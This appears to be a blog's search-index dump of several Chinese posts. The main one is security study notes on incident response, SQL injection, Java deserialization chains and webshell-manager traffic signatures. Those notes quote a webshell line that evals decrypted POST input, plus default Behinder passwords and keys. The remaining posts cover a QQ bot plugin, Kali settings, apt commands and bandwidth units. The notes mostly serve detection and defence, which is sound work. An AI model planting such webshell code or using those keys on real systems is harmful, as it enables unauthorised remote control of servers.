语句查询数据库有多少字段\n\n使用联合查询来查询 union select\nUser（） 当前用户\nDatabase() 数据库\nVersion() 数据库版本\n\n查询数据库中的表. 列和值\n\n\n应急响应问题linux 服务器被上传 webshell，如何进行应急\n在网站的根目录下用下河马或者 d 盾扫下看看，看看能不能扫出 webshell\n\n查看网站的 web 日志，使用 weblshell 会在网站的 web 日志中留下 Webshell 页面的访问数据和数据提交记录，主要特征是少量 ip 对其发起访问，总的访问次数少，该页面属于孤立页面\n\n看下相关设备的告警流量，看下 web shell 的名字和路径，然后在服务器上使用 find 命令进行查找。并删除\n\n\nhw 期间的应急响应\n一般先封堵攻击源 IP，事件处置组人员根据攻击事件通报信息或报告，封禁攻击源 IP\n\n事件处置组人员根据攻击事件报告，处置安全事件，处置方式包括：安全设备策略调整、系统下线、服务器排查、应用排查、加固整改、系统上线\n\n上报安全事件，上报接口人根据攻击行为报告和处置报告，对攻击事件、威胁处置上报演习系统上报平台\n\n\n除了杀进程还有什么方法可以快速找到 webshell 吗？因为有时候占用率高的不一定是木马，也可能是业务相关进程看下相关设备的告警流量，看下 webshell 的名字和路径，然后在服务器上使用 find 命令进行查找。\n或者在网站的根目录下用下河马或者 d 盾扫下看看，看看能不能扫出 webshell。\n应急响应的流程？应急响应常用的工具？火绒剑、d 盾、河马(linux 和 windows 通用)、微步云沙箱.\n查看进程、注册表的工具有了解吗？火绒剑可以一键查看进程和注册表. LastActivityView\nwindows 应急响应\n进程排查 netstat -ano 查看目前的网络连接，定位可以的 ESTABLISHED,根据 netstat 定位的 pid(进程编号)再通过 taskli st 显示运行本地或远程计算机的所有进程\n\n用户组情况判断 查看服务器中的，dos 命令 net user 查看隐藏的账户注册表 HKEY_LOCAL MACHINE\\SAM\\SAM\\Domains\\Acco unt\\Users\\Names\n\n服务相关判断 运行 command+R m sconfig(打开系统设置)服务\n\n系统启动项排查 msconfig 启动\n\n计划任务创建&#x2F;删除检测 cmd 中 scht asks.exe\n\n注册表的排查注册表的排查，建议使用杀软去做文件排查查看最近访问的目录：recent webshell:D 盾、河马 webshell C2后门：360、卡巴、诺顿\n\n日志排查 windows 登录日志排查运行 eventvwr4624 账号成功登录 4625 账号登录失败\n\n中间件日志排查 不同中间件有不同日志目录看源 p 目的 ul 时间响应码可以用工具：360 星图日志结尾一般为 acess.logo\n\n\nlinux 应急响应\n文件排查：tmp 目录文件（临时文件）Is-alt &#x2F;tmp\n\n启动项排查：查看开启启动项内容 ls-alt&#x2F;etc&#x2F;init..d&#x2F;\n\n查看命令执行记录：直接 history 或者 cat~&#x2F;bash_history\n\n用户信息排查&#x2F;etc&#x2F;passwd\n\n计划任务排查 crontab 查看当前的计划有那些，是否有后门木马程序启动相关信息\n\n进程排查：netstat-antlp,根据 n etstat 定位出 pid,使用 ps 命令，分析进程 top\n\n系统登录日志排查：ssh 日志：&#x2F;var&#x2F;log&#x2F;lastlog 查看最近登录的记录系统中所有用户最近一次登录信息：lastlog\n\n中间件日志查询 Apache:var&#x2F;log&#x2F;httpd&#x2F;Ngix:var&#x2F;log&#x2F;nginx&#x2F;&#x2F;\n\n后门排查使用河马 webshell&#x2F;find(命令)可以用工具：GScan\n\n\n勒索病毒的应急响应？\n首先了解现状、了解发病时间和系统架构，确认被感染的主机\n\n先进行临时处置，对被感染的主机进行网络隔离，禁止使用移动存储设备，对未感染的主机进行 ACL 隔离，关闭 SSH（Linux 的远控），RDP（Windows 的远控）等协议，也不能适用移动存储设。\n\n获取样本，Windows 系统进行文件排查，进程排查，系统信息排查，系统日志排查；Linux 系统排查文件、进程、日志\n\n进行进一步的处置，对已经感染的主机，进行断网隔离，等待解密进展，最后重装系统，对位感染的主机进行补丁修复，还可以使用安全软件进行防护并及时更新病毒库&#x2F;规则库\n\n最后是防御，定期打补丁，部署杀软，对口令策略进行加固，部署流量监测设备。\n\n\n挖矿应急响应\n判断\n\n查看 CPU 占用率（判断 CPU 占用率是否过高）\n\n查看天眼的流量分析，是否去别的有危险的网站下载东西，然后在本地执行了挖矿的一些命令（结合天眼设备分析，看是否去可以网站下载过东西，或在本地执行挖矿命令）\n\n是否有外连，向远程 IP 的请求（netstat -ano 查看所有端口）\n\n\n\n事件分析（第二步分析）\n\n登录网站服务器，查看进程是否有异常；（查看网站服务器是否有异常进程 系统命令 tasklist）\n\n进行查看异常进程的服务项是什么…选择可疑服务项，然后停止服务，其启动类型会变为静止。（并查看它的服务项，尤其是可疑服务（系统命令 services.msc 查看服务项））\n\n进行查看一下计划任务有没有可疑的（查看一下有没有可疑的计划任务）\n\n\n\n临时解决方案（最后解决并处置）\n\n停止并禁用可以服务项，有时候服务项的名称会变，但描述不会变，根据描述快速找到服务项，删除服务项（然后根据描述寻找可疑服务项，停用可疑服务项）\n\n根据实际存在木马的路径，进行删除木马（如果知道木马的路径的话，直接删除木马）\n\n重启服务器\n\n使用杀软全盘查杀\n\n\n\n\nJava 反序列化的 CC 链构造原理Java 反序列化的 CC 链构造原理涉及了 Java 反序列化机制、Commons Collections 库中的 Transformer 接口以及漏洞利用的过程。以下是构造 CC 链的基本原理：\nJava 反序列化机制：Java 的反序列化机制允许将对象从字节流中重新构建成实例。这个过程涉及到将对象的状态信息从字节流中读取出来，并使用这些信息来构造对象的实例。Java 中的反序列化由 ObjectInputStream 类来执行。\nCommons Collections 库中的 Transformer 接口：Commons Collections 库提供了一组 Transformer 接口和实现，用于对对象进行转换和操作。其中，Transformer 接口定义了一个单一方法 transform，用于对输入对象进行转换并返回转换后的对象。攻击者可以构造一个 Transformer 链，将多个 Transformer 对象串联起来，形成一个 CC 链。\n漏洞利用过程：构造的 CC 链会利用 Commons Collections 库中的某些 Transformer 实现中的漏洞，通过反序列化触发漏洞，并最终实现攻击者预期的恶意操作。通常情况下，这些漏洞会导致在反序列化过程中执行任意代码或者执行特定的恶意操作。\n具体来说，构造 CC 链的过程可能包括以下步骤：\n\n选择合适的 Transformer 实现，并组成一个 Transformer 链。\n构造一个带有 CC 链的序列化数据，通常使用 Java 的序列化机制实现。\n将序列化数据输入到目标应用程序中，通过反序列化触发漏洞，使 CC 链得以执行。\n\n最终，CC 链中的 Transformer 将按照预期执行，并实现攻击者的目标，例如执行任意代码或者获取系统权限。\n总的来说，Java 反序列化的 CC 链构造原理涉及了利用 Commons Collections 库中的 Transformer 接口和 Java 的反序列化机制，通过构造特定的 Transformer 链并利用漏洞来实现攻击目标。\n讲一下 TOP10 有哪些？1.失效的访问控制\n2.加密机制失效\n3.注入（包括跨站脚本攻击 XSS 和 SQL 注入等）\n4.不安全设计\n5.安全配置错误\n6.自带缺陷和过时的组件\n7.身份识别和身份验证错误\n8.软件和数据完整性故障\n9.安全日志和监控故障\n10.服务端请求伪造 SSRF\n冰蝎、菜刀、蚁剑、哥斯拉的特点菜刀：ASP 语言编写的 Windows 远控管理软件，年代比较久，鼻祖级别的，曾经风靡一时，现已经逐渐被其他三个所取代冰蝎：基于 Java 编写，有跨平台特性，流量动态加密（AES128 + 随机密钥）哥斯拉：基于 C#编写，流量加密能过大部分静态查杀和 WAF（查杀和 WAF 也在更新，随时就可能不行了），自带的各种插件功能异常强大蚁剑：基于 Java 编写跨平台远控管理工具，模块化开发，代码简单易懂，可扩展性强\n冰蝎、菜刀、蚁剑、哥斯拉的流量特征菜刀： 流量特征主要表现在 HTTP 协议上，使用 HTTP 协议通信，控制命令和数据都通过 POST 请求传输。因此，可以通过 HTTP 请求头中的 User-Agent、Referer 等信息进行识别蚁剑： 流量特征主要表现在数据包的加密方式和数据类型。蚁剑使用了 AES 加密算法对数据进行加密，同时还使用了自定义的二进制协议，在通信中传输各种类型的数据冰蝎： 流量特征主要表现在数据包中的特殊标记和传输的数据类型。冰蝎的数据包中包含了特定的标记，如”flag&#x3D;0x52415631”，用于标识该数据包是冰蝎的控制命令。此外，冰蝎还使用了一种自定义的二进制协议，在通信中传输各种类型的数据。哥斯拉： 流量特征主要表现在数据包的特殊标记和数据类型。哥斯拉的数据包中包含了特定的标记，如”XORHEAD”和”XORBODY”，用于标识该数据包是哥斯拉的控制命令。此外，哥斯拉还使用了一种自定义的二进制协议，在通信中传输各种类型的数据\n冰蝎的通信原理攻击者发送连接请求至服务端，建立 SSL&#x2F;TLS 协议的加密通道，使用 HTTP 协议进行数据传输，并且对数据进行了加密处理，保证通信内容的机密性服务端返回一个随机数作为密钥（目前是 16 位 MD5），存储在 $_SESSION 中返回给客户端客户端输入待执行命令，使用上述返回的密钥进行加密（目前是 AES 128），发送至服务端服务端解密，执行相关命令，并加密执行结果（目前是 AES 128）客户端对执行结果解密固定的请求字节头（dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M 解密后： @error_reporting;\\r）和固定的响应字节头（TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd 解密后： {“status”:”c3VjY2Vzcw&#x3D;&#x3D;”,”msg”:”）默认连接密码 rebeyond，冰蝎 4.0 有一串固定密钥 e45e329feb5d925b ，是默认连接密码的 32 位 MD5 值的前 16 位\n冰蝎的流量特征Accept ： Accept: application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01Content-Type ：大量的 Content-type: Application&#x2F;x-www-form-urlencodedUser-Agent ： 随机的Port：端口通常在 49700 附近代码：webshell 固定代码，不同开发语言的 webshell 代码不同。如 $post=Decrypt(file_get_contents(“php://input”)); eval($post)连接：冰蝎为了减少开销，默认使用长链接，请求头和响应头中会带有 Connection: Keep-Alive\n冰蝎流量特征2.1 冰蝎 2.0使用AES加密 + base64编码，AES 使用动态密钥对通信进行加密，进行请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。因此当发现一个 ip 的请求头中的 user-agent 在频繁变换，就可能是冰蝎。2.2 冰蝎 3.0使用 AES 加密 + base64 编码,取消了 2.0 的动态获取密钥，使用固定的连接密钥，AES 加密的密钥为 webshell 连接密码的 MD5 的前 16 位，默认连接密码是”rebeyond”(即密钥是 md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)。进行请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。因此当发现一个 ip 的请求头中的 user-agent 在频繁变换，就可能是冰蝎。\n3.0 连接 jsp 的 webshell 的请求数据包中的 content-type 字段常见为 application&#x2F;octet-stream。\n2.3 冰蝎 4.0提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0 版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。Accept 字段（弱特征），通常是 Accept: application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01 意思是浏览器可接受任何文件，但最倾向 application&#x2F;json 和 text&#x2F;javascript。Content-Type 字段（弱特征），通常是 Content-type: Application&#x2F;x-www-form-urlencoded与冰蝎的前述版本相似，进行请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。连接的端口有一定的特征，冰蝎与 webshell 建立连接的同时，java 也与目的主机建立 tcp 连接，每次连接使用本地端口在 49700 左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd默认时，冰蝎 webshell 都有“e45e329feb5d925b” 一串密钥，与冰蝎 3.0 相同。 3. 哥斯拉流量特征哥斯拉支持多种加密方式，采用了和冰蝎 2.0 类似的密钥交换方式。它的 webshell 需要动态生成，可以根据需求选择不同的加密方式。\n3.1 哥斯拉静态特征在默认脚本编码的情况下，jsp 会出现 xc、pass 字符和 Java 反射(ClassLoader，getClass().getClassLoader())，base64 加解码等特征。\n3.2 哥斯拉动态特征User-Agent 字段（弱特征），如果采用默认的情况，会暴露使用的 jdk 信息。不过哥斯拉支持自定义 HTTP 头部，这个默认特征是可以很容易去除的。Accept 字段（弱特征），默认是 Accept:text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, &#x2F;; q&#x3D;.2。同上，这个也可修改，只能作为辅助检测的特征。Cookie 中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。响应体的数据有一定特征，哥斯拉会把一个 32 位的 md5 字符串按照一半拆分，分别放在 base64 编码的数据的前后两部分。整个响应包的结构体征为：md5 前十六位+base64+md5 后十六位。\nhttps://www.cnblogs.com/-andrea/p/17473499.html#/\n","categories":["HW"],"tags":["HW"]},{"title":"HuYanSession2——壶言会话2使用手册","url":"/posts/7a43906e.html","content":"壶言手册发布页\n自定义回复权限id：session\n参数所有自定义回复都会携带作用域和匹配方式参数！支持更简洁的输入且都是可选！默认为精准和全局！\n[]和()指数学中的域，在本插件表示可填写和必填写；|为或，表示两边都可以用；\n以下所有指令均适用于此表示方法!\n\n[精准|1] 精准匹配\n[模糊|2] 模糊匹配\n[头部|3] 头部匹配\n[结尾|4] 结尾匹配\n[全局|0] 全局匹配\n[当前|-1] 当前群匹配\n[群组(id)|gr(id)] 指定群组匹配\n\n具体参数含义可以去壶言1查看\n\n一对一回复(会话)权限id：sessionx\n直接上指令\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\nxx (触发内容) (回复内容) [参数]\n快速添加关键字回复 参数可多填，以空格隔开\nxx 怎么办 凉拌 2 0\n学习 怎么办 凉拌 模糊 全局\n\n\nxx：[触发内容]\n查询所有已保存的关键词回复,冒号中英都支持，后续的触发内容填上就是查询对应的那条\nxx:\n查询 怎么办\n\n\n-xx：(触发内容)\n删除对应的关键词\n-xx:怎么办\n删除 怎么办\n\n\n%xx\n通过多次消息发送的形式添加对话,便于手机使用\n%xx\n学习对话\n\n\n-%xx\n由于多次消息形式添加的对话的触发词可能含有空格，因此要用对应的方式删除\n-%xx\n删除对话\n\n\n学习对话参数：\n\n0 | 全局 修改触发作用域为这个机器人的所有群\n1 | 精准 只有发的消息跟触发词相同，才能触发回复，不填写参数默认\n2 | 模糊 发送消息包含触发词即可触发。\n3 | 头部 发送消息的开头为触发词即可触发\n4 | 结尾 发送消息的结尾为触发词即可触发\n5 | 正则 以正则匹配触发消息，仅限%xx学习功能\n-1 | 当前 修改触发作用域为当期这个群，不填写参数默认\ngr(id) | 群组(id) 修改作用域为对应的群组id，()不是指令，只是说明这个id必须填写，群组的使用方式在下方\n\n所有参数都在聊天指令的结尾以(空格)(参数)添加，无序。\n对话和多词条支持的动态消息：\n欢迎词支持的动态消息:\n\n\n\n动态消息类型\n动态消息参数\n含义\n案例\n匹配结果\n\n\n\nat\nthis\n@(at)触发这条消息的人\n$at(this)\n@放空\n\n\n\nqq\n@群里的这个人，会固定@这个人\n$at(572490972)\n@放空\n\n\nmessage\nthis\n这个人触发这条消息的内容\n$message(this)\n不会写插件怎么办？\n\n\nuser\nname\n获取这个人的名称\n$user(name)\n放空\n\n\n\nid\n获取这个人的qq\n$user(id)\n572490972\n\n\n\navatar\n获取这个人的头像\n$user(avatar)\n[图片]\n\n\n\ntitle\n获取这个人的头衔，优先获取特殊头衔\n$user(title)\n才不是放空了~\n\n\n\ninfo\n详细信息??\n$user(info)\n\n\n\ntime\nnow\n获取当前时间，默认格式yyyy-MM-dd HH:mm:ss\n$time(now)\n2022-8-28 02:15:15\n\n\n\n(时间格式)\n按照指定的时间格式进行现在的时间输出\n$time(HH:mm:ss)\n02:16:20\n\n\n\n正则消息回流(仅限一对一回复)请以%xx学习，学习内容为(你的正则1)，与之对应的回复内容为$mate(1)，参数为5，也就是正则匹配，1对应第一个括号匹配的内容。\n案例：\n与之类似的，你只需要更改括号中正则，就可以达到你想要的东西。\n\n一对多回复(多词条)权限id：sessiondct指令:\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n%dct\n添加多词条\n%dct\n添加多词条\n\n\ndct:\n查询所有多词条\n%dct\n查询多词条\n\n\n-dct:(id) [id]\n删除多词条，id通过查询得到，第一个id是对应的多次条id，第二个id是对应回复语句id，如果填写，就是删除这个多次回复语句下的这条回复，支持空格隔开一次删除多条\n-dct：5\n删除：2 34 44 23\n\n\n在添加多词条消息的途中，发送\n\n!!! | ！！！ 结束添加，不进行保存，直接结束这次操作\n!! | ！！ 在循环添加回复内容时，停止添加，退出进行多词条消息的保存\n! | ！ 删除上一条添加的内容\n\n添加多词条参数：\n\n1 | 精准 只有发的消息跟触发词相同，才能触发回复，不填写参数默认\n2 | 模糊 发送消息包含触发词即可触发。\n3 | 头部 发送消息的开头为触发词即可触发\n4 | 结尾 发送消息的结尾为触发词即可触发\nlx | 轮询 多个词条回复的顺序为轮询，就是一条一条发送去,不填写参数默认\nsj | 随机 修改回复顺序为随机,就是触发后随机从多词条中取一条拿来回复\n0 | 全局 修改触发作用域为这个机器人的所有群\ngr(id) | 群组(id) 修改作用域为对应的群组id，()不是指令，只是说明这个id必须填写\n\n单个多词条回复语句也支持动态消息，具体支持看上面的对话动态消息支持\n\n群组权限id：list用于设定特定几个群的群组系统，用于一些东西只在这几个群中触发，其他插件有个相反的功能叫群黑名单，我这个是正向的，只在那些群触发。\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n+gr:(id) (群号)\n添加多个群为一个群组，群号支持多个\n+gr：1 780594692\n添加群组：1 780594692 390444068\n\n\ngr:[id]\n查询所有群组信息，id填写后只查询对应的id所属群组信息\ngr：\n查询群组：1\n\n\n-gr:(id) [群号]\n删除这个群组里面的某个群号，支持多个群号\n-gr:1\n删除群组：1 390444068 780594692\n\n\n与之类似，你只需要更换你的正则匹配就可以\n\n定时器权限id：ds\n\n定时任务是指，按照指定的时间频率发送对应的消息，时间频率是cron表达式，不懂的人可以花5分钟了解一下，基本能满足任何时间频率cron输入格式$cron(* * * * * ?)\n定时管理指令:\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n%ds\n添加定时任务，具体根据提示进行添加\n%ds\n&#96;添加定时器\n\n\n-ds(id)\n删除定时任务，id查询获得\n-ds：1\n&#96;删除定时器：1\n\n\n在添加回复消息的途中，发送\n\n!!! | ！！！ 结束添加，不进行保存，直接结束这次操作\n!! | ！！ 在循环添加回复内容时，停止添加，退出进行定时任务的保存\n! | ！ 删除上一条添加的内容\n\n定时任务的参数：\n\nhf | 回复 定时器触发后只回复一条消息，不填参数默认\nlx | 轮询 定时器的回复内容将成为多词条的样式，并且回复词条顺序为轮询，与随机冲突！\nsj | 随机 定时器的回复内容将成为多词条的样式，并且回复词条顺序为随机，与轮询冲突！\n-1 | 当前 作用域-当前这个群 默认\n0 | 全局 作用域-全部群\ngr(id) | 群组(id) 作用域-指定群组\n\n定时器操作权限id：dscz\n\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\nds:\n查询定时任务\nds：\n&#96;查询定时器\n\n\n%ds:(id)\n切换定时任务的状态，如果已经开启，则切换为关闭，id查询获取\n%ds:1\n&#96;切换定时器:1\n\n\n\n群管理权限id：group 此权限不是指令权限\n对于几个检测群的功能，需要先将对于群添加为检测群\n/hy agroup (群号) #添加/hy dgroup (群号) #删除\n\n依然支持在config文件手动添加\n\n特殊头衔当你的机器人是群主时才可以使用,拥有admin、group权限的用户也可以用于使用。\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n%@(user) (内容)\n给这个人修改特殊头衔\n%@放空 才不是放空了~\n设置头衔@放空 才不是放空了~\n\n\n是群主才行哦~\n\n群欢迎词权限id：grouphyc当有人申请的时候，拥有管理员权限的机器人并且加入了检测的群机器人会给出提示在配置文件中有是否启用开关\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n&#96;开门 id\nall&#96;\n同意这个人的进群申请\n开门 1\n\n\n&#96;同意 id\nall&#96;\n同意这个人的进群申请\n同意 1\n\n\n&#96;关门 id\nall&#96;\n关门这个人的进群申请\n关门 1\n\n\n&#96;拒绝 id\nall&#96;\n拒绝这个人的进群申请\n拒绝 1\n\n\nid是进群时所提示的门牌号\n欢迎词功能不需要检测群支持！欢迎词指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n%hyc\n添加欢迎词\n%hyc\n添加欢迎词\n\n\nhyc：\n查询欢迎词词\nhyc:\n查询欢迎词\n\n\n-hyc:(id) [id]\n删除欢迎，id查询获得，第二个id是对应的欢迎词集合中的某条欢迎词，不支持多条删除\n-hyc：2\n删除欢迎词：1 15\n\n\n参数:\n\nlx | 轮询 欢迎词将以轮询的方式逐条发送，默认\nsj | 随机 欢迎词将随机发送\n0 | 全局 作用域：全局\ngr(id) | 群组(id) 作用域：群组\n\n欢迎词支持的动态消息:\n\n\n\n动态消息类型\n动态消息参数\n含义\n案例\n匹配结果\n\n\n\nat\nthis\n@(at)这个进群的人\n$at(this)\n@放空\n\n\n\nthat\n这个要请他的人，如果没有邀请的人则会at同意他进来的那个人\n$at(that)\n@放空\n\n\n\nqq\n@群里的这个人，会固定@这个人\n$at(572490972)\n@放空\n\n\nmessage\napply\n获取这个人进群申请的消息\n$message(apply)\n这个人什么都没说…\n\n\nuser\nname\n获取这个人进群时的名称\n$user(name)\n放空\n\n\n\nid\n获取这个人的qq\n$user(id)\n572490972\n\n\n\navatar\n获取这个人的头像\n$user(avatar)\n[图片]\n\n\ntime\n所有支持动态消息的都支持时间，具体用法在文档前面的对话\n\n\n\n\n\n\n禁言权限id：groupjy\n\n此指令只有在你的机器人是管理员或群主才能触发\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n@某人(禁言时间)\n在机器人有权限的情况下，对你@的这个人进行指定时间的禁言\n@放空 3m\n&#96;&#96;\n\n\n@某人 0s\n解除禁言\n@放空\n&#96;&#96;\n\n\n时间频率：\n\ns 秒\nm 分钟\nh 小时\nd 天\n\n\n违禁词不需要检测群支持。此指令只有在你的机器人是管理员或群主才能起作用。\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n+wjc:(内容) [param]\n添加违禁词，内容是触发内容，param是参数，具体可以查看下方\n+wjc:色图 ch 2m\n添加违禁词：色图 % jy\n\n\n-wjc:(id)\n删除违禁词，id查询获得\n-wjc：2\n删除违禁词：2\n\n\nwjc：\n查询所有违禁词\nwjc：\n查询违禁词\n\n\n参数的意义\nch 违禁词默认撤回，当输入ch后，wjc将不撤回消息\njy 违禁词默认禁言，当输入jy后，wjc将不禁言\n3s 修改禁言时间,具体时间格式查看禁言\n% 重写回复语句,支持动态消息，具体支持动态消息查看下方\n[gr1 | 0 ] 群组或全局，默认当前群\n1,2,3,4 匹配方式，跟关键词回复的匹配同理\nhmd3 开启触发3次后就会踢出群聊，数字可自选\n\nhmd参数输入后，将会开启小黑屋功能，不会提示！当某个人触发这个wjc到达次数，直接踢出本群，可以和下面的自动添加黑名单配合！\n违禁词回复消息支持动态消息：\n\n\n\n动态消息类型\n动态消息参数\n含义\n案例\n匹配结果\n\n\n\nat\nthis\n@(at)触发这条消息的人\n$at(this)\n@放空\n\n\n\nqq\n@群里的这个人，会固定@这个人\n$at(572490972)\n@放空\n\n\nmessage\nthis\n这个人触发这条消息的内容\n$message(this)\n不会写插件怎么办？\n\n\n\njyString\n这条违禁词的禁言时间中文\n$message(jyString)\n禁言2分钟\n\n\n\nprohibitString\n同上\n\n\n\n\n\nnull\n不发送消息\n$message(null)\n\n\n\nuser\nname\n获取这个人的名称\n$user(name)\n放空\n\n\n\nid\n获取这个人的qq\n$user(id)\n572490972\n\n\n\navatar\n获取这个人的头像\n$user(avatar)\n[图片]\n\n\n\ntitle\n获取这个人的头衔，优先获取特殊头衔\n$user(title)\n才不是放空了~\n\n\n\ninfo\n详细信息??\n$user(info)\n\n\n\ntime\nnow\n获取当前时间，默认格式yyyy-MM-dd HH:mm:ss\n$time(now)\n2022-8-28 02:15:15\n\n\n\n(时间格式)\n按照指定的时间格式进行现在的时间输出\n$time(HH:mm:ss)\n02:16:20\n\n\n\n黑名单权限id：grouphmd\n\n不需要检测群支持。此指令只有在你的机器人是管理员或群主才能触发。支持作用域！！设置为全局时，该用户将被你的bot封禁！\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n+hmd:@(user) [param]\n添加黑名单，参数看下方\n+hmd:@放空 jy\n添加黑名单:@放空 %\n\n\nhmd:\n查询黑名单\nhmd:\n查询黑名单\n\n\n-hmd:(id)\n删除黑名单,id查询获得\n-hmd:3\n删除黑名单:2\n\n\n参数：\n\nt 默认检测到就踢出，携带参数不踢出\njy 默认禁言(优先踢出),携带参数不禁言\nch 默认撤回该用户的消息，携带不提出\n0 | gr(id) 作用域不携带参数默认当前群\n% 重写封禁理由\n\n此功能需要检测群支持！在配置文件blacklist有退群自动添加黑名单开关！里面还有重写封禁理由！\n\n撤回消息权限id：groupch\n\n用于撤回上面的群消息，机器人是管理员和群主才能使用\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n!recall\n撤回上面这条消息\n!recall\n撤回\n\n\n！recall (number)\n撤回前面几条消息，不包含这条消息\n！recall 5\n撤回 5\n\n\n!recall 1-5\n撤回上面1到5条，从第0条算起，包含这条消息\n!recall 1-5\n撤回 25-55\n\n\n具体用法试一试就明白，撤回多条消息时，权限可能会有冲突。\n\n踢人权限id：grouptr\n\n此指令只有在你的机器人是管理员或群主才能触发\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\ntr@(user) [hmd]\n踢人\ntr@放空\n踢人@放空\n\n\n参数：\n\nhmd qq的踢人有个禁止此用户再次加群，输入后将禁止此用户再次加群\n\n\n权限系统权限id：admin\n\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n+@(user) (权限id)\n赋予这个群的这个人的某个权限,权限id可在文档查看\n+@放空 admin\n添加@放空 all\n\n\n-@(user)\n移除这个权限\n-@放空 all\n删除@放空 group\n\n\n！power [param]\n查询权限列表，参数如下\n!power all\n权限列表 all\n\n\n参数：\n\n&#96;&#96;不填默认当前群\n@某人 查看指定人在本群的权限\nall 查询所有权限或添加所有权限或删除所有权限\n\n查询可以输入对应的群号 或者 qq号 来查询指定区域的权限信息也可以直接 all 查询全部然后通过 上一页 和 下一页 来进行翻译阅读\n\n多机器人互冲对于同时加载多个bot的使用者容易存在一条指令两个bot触发，因此，加了一个‘暂停功能’\n指令：\n\n\n\n指令\n含义\n案例\n中文格式\n\n\n\n！pause @(bot)\n你发的下一条消息，这个机器人将会忽略(包括触发)\n！pause@乌拉\n\n\n\n!pause @(bot) 5\n忽略下5条消息，消息数量自定\n！pause @乌拉 5\n\n\n\n不带参数，默认忽略你的下一条消息也可以自定义忽略下几条消息，这个记录是写在内存的，如果不小心输入多了（9999999999），重启就行。\n\n插件指令\n\n\n指令\n含义\n案例\n\n\n\n/hy aGroup\n添加一个监测群\n/hy aGroup 390444068\n\n\n/hy dGroup\n删除一个监测群\n/hy dGroup 390444068\n\n\n/hy v\n查询当前插件版本\n/hy v\n\n\n/hy transfer\n转移一个所属bot的数据到另一个bot\n/hy transfer 2061954151 3630254205\n\n\n","categories":["QQbot"],"tags":["QQbot"]},{"title":"Kali Linux如何修改语言为中文","url":"/posts/4c6d962f.html","content":"友情提示修改前快照一下，避免修改操作错误带来的问题！\n\n打开终端\n\n打开设置\n输入\ndpkg-reconfigure locales\n\n修改设置\nen_US.UTF-8 UTF-8改为不勾选\n\n下面这种有个*属于已经勾选了\n通过上下箭头按键我们把红点（表示当前选中的选项）移动到en_US.UTF-8 UTF-8，按下空格表示不勾选&#x2F;勾选\n使用空格勾选[ ]zh_CN.GBK_GBK 和[ ] zh-CN.UTF-8.UTF-8两个选项，这里有部分虚拟机会找不到[ ]zh_CN.GBK_GBK，这两个选项是紧跟着的，找不到就算了，问题不大。\n按下enter 表示ok，选择语言zh_CN.UTF-8\n\n\n重启生效设置\n重启后会有个提示，建议你选择保留旧名称，以后路径敲代码敲英文肯定比敲中文方便很多！\nreboot\n\n\n原文：https://blog.csdn.net/u011027547/article/details/123344249\n","categories":["Linux","kali"],"tags":["Linux"]},{"title":"Linux更新软件包一条龙命令","url":"/posts/82a71d79.html","content":"apt-get update 更新索引\napt-get update\n\napt-get upgrade 更新软件\napt-get upgrade\n\napt-get dist-upgrade 升级\napt-get dist-upgrade\n\napt-get clean 删除缓存包\napt-get clean\n\napt-get autoclean 删除未安装的 deb 包\napt-get autoclean\n\n","categories":["Linux"],"tags":["Linux"]},{"title":"Mbps，Mb/s, MB/s的区别","url":"/posts/66b2f6fd.html","content":"为了搞懂这几个单位之间的区别，我们首先需要弄懂这其中的最重要的 B 与 b 分别代表了什么\nb，通常为 bit 的简称，中文为比特，计算机存储传输中的最小单位\nB，通常为 Byte 的简称，中文为字节，其中 1Byte&#x3D;8bit\n其中，bit 这个单位太小了，通常只在数据通信形容带宽时出现\n单位转换1 Byte &#x3D; 8 bit\n1 KB &#x3D; 1024 B (KB, KiloByte)\n1MB &#x3D; 1024 KB (MB, MegaByte)\n1 GB &#x3D; 1024 MB (GB, GigaByte)\n1 TB &#x3D; 1024 GB (TB, TeraByte)\n这些单位通常用来指代某个文件大小，或者说存储设备的存储容量\n以上通常用来指代存储大小，而如果形容传输速度或者下载速度的话\n那么，很明显我们还需要结合时间单位 s，秒\n加上了秒，我们就可以得到更加丰富的单位\nMbps, Megabits per second，兆比特每秒\nMb&#x2F;s, Megabits per second，兆比特每秒\nMB&#x2F;s, MegaByte per second, 兆字节每秒\n值得注意的是，在描述计算机网络传输速率时，它们之间的转换倍数不再是 1024 而是 1000\n1 Kb&#x2F;s &#x3D; 1000 b&#x2F;s\n1 Mb&#x2F;s &#x3D; 1000 Kb&#x2F;s\n1 Gb&#x2F;s &#x3D; 1000 Mb&#x2F;s\n搞明白了这个基本含义，那么我们可以很轻松得到这几个常见单位之间的转换关系了\n1 MB&#x2F;s &#x3D; 8 Mb&#x2F;s 